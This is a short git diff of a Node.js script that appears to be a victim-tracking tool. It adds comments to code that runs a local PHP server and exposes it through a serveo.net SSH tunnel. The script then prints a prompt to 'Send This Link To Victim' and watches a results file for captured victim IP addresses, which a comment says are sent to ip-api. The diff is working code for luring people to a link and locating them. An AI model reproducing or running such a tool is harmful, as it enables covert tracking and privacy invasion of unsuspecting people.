@@ -13,6 +13,7 @@ var notif = require("beeper");
 var check = require("log-symbols")
 var cow = require("cowsay")
 
+// Cowsay :)
 console.log(cow.say({
 	text : "Hello Users :)",
 	e : "o0",
@@ -37,10 +38,18 @@ const user = r.createInterface({
 var userinput = c.rainbow('[ Input Website Name ] >_  ');
 
 user.question(userinput, (q) => {
+    // Create php local server
     cmd.exec("php -S localhost:8000 > /dev/null 2>&1 & ");
+	
+    // Make online php server by port forwarding
     cmd.exec("ssh -o ServerAliveInterval=60 -R " + `${q}` + ":80:localhost:8000 serveo.net > /dev/null 2>&1 &");
+
+    // Tell user if server already start
     console.log(c.blue("[ Send This Link To Victim ] > " + `${q}` + ".serveo.net"));
+   
     loading("Listening...\n\n").start();
+    
+     // Watch file changes and send to ip-api website
     f.watchFile("result.txt", function(current, previous){
     var a = f.readFileSync("result.txt", "utf8");
     var ipvictim = a.substr(7, 13);
